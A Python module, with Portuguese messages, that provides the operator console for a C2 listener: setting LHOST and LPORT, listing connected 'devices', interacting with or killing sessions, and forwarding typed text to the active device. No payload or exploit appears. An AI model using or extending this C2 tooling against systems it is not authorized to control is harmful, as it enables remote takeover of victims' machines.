from .config import (
    VERDE, VERMELHO, AMARELO, CIANO, CINZA, NEGRITO, RESET,
)
from .logger import log


def cmd_set(c2, args):
    partes = args.split(None, 1)
    if not partes:
        log("uso: set <opcao> <valor>", AMARELO)
        return
    chave = partes[0].upper()
    if len(partes) < 2:
        if chave in c2.opcoes:
            log(f"{chave} = {AMARELO}{c2.opcoes[chave]}{RESET}", CIANO)
        else:
            log(f"opcao desconhecida: {chave}", AMARELO)
        return
    if chave not in c2.opcoes:
        log(f"opcao desconhecida: {chave}", AMARELO)
        return
    valor = partes[1].strip()
    if chave == "LPORT":
        try:
            int(valor)
        except ValueError:
            log("LPORT deve ser numero", VERMELHO)
            return
    c2.opcoes[chave] = valor
    log(f"{chave} => {AMARELO}{valor}{RESET}", VERDE)


def cmd_show(c2, args):
    alvo = args.strip().upper()
    if alvo and alvo in c2.opcoes:
        log(f"{alvo} = {AMARELO}{c2.opcoes[alvo]}{RESET}", CIANO)
        return
    print(f"\n{CIANO}{NEGRITO}{'OPCAO':<10}{'VALOR':<20}{RESET}")
    print(f"{CIANO}{'-'*30}{RESET}")
    for k, v in c2.opcoes.items():
        print(f"{AMARELO}{k:<10}{RESET}{v:<20}")
    print()


def cmd_sessions(c2, args):
    partes = args.split()
    if len(partes) >= 2:
        flag = partes[0]
        try:
            cid = int(partes[1])
        except ValueError:
            log("id invalido", AMARELO)
            return
        if flag == "-i":
            if cid in c2.clientes:
                c2.ativo = cid
                log(f"interagindo com {AMARELO}dev{cid}{RESET}", VERDE)
            else:
                log(f"dispositivo {cid} nao existe", VERMELHO)
        elif flag == "-k":
            cli = c2.clientes.get(cid)
            if cli:
                cli.fechar()
                log(f"dev{cid} derrubado", VERMELHO)
            else:
                log(f"dispositivo {cid} nao existe", VERMELHO)
        else:
            log(f"flag desconhecida: {flag}", AMARELO)
        return

    with c2.lock:
        clientes = list(c2.clientes.values())
        ativo = c2.ativo

    if not clientes:
        log("nenhum dispositivo conectado", AMARELO)
        return

    print(f"\n{CIANO}{NEGRITO}{'ID':<6}{'IP':<18}{'STATUS':<10}{RESET}")
    print(f"{CIANO}{'-'*34}{RESET}")
    for c in clientes:
        marca = f"{VERDE}ativo{RESET}" if c.id == ativo else f"{CINZA}idle{RESET}"
        print(f"{AMARELO}{c.id:<6}{RESET}{c.addr[0]:<18}{marca}")
    print()


def cmd_help(c2, args):
    print(f"""
{CIANO}configuracao:{RESET}
  {AMARELO}set LHOST <ip>{RESET}        ip do listener (padrao 0.0.0.0)
  {AMARELO}set LPORT <porta>{RESET}     porta do listener (padrao 4444)
  {AMARELO}show [opcao]{RESET}          mostra configuracao
  {AMARELO}run{RESET}                    inicia o listener
  {AMARELO}stop{RESET}                   para o listener

{CIANO}sessoes:{RESET}
  {AMARELO}sessions{RESET}               lista dispositivos
  {AMARELO}sessions -i <id>{RESET}       interage
  {AMARELO}sessions -k <id>{RESET}       derruba conexao
  {AMARELO}background{RESET}             sai da sessao (sem matar)

{CIANO}geral:{RESET}
  {AMARELO}help{RESET}                   esta ajuda
  {AMARELO}exit{RESET}                   encerra C2
  {AMARELO}clear{RESET}                  limpar tela
{CIANO}qualquer outro texto{RESET} e enviado ao dispositivo ativo.
""")


COMANDOS = {
    "set": cmd_set,
    "show": cmd_show,
    "options": cmd_show,
    "sessions": cmd_sessions,
    "help": cmd_help,
}
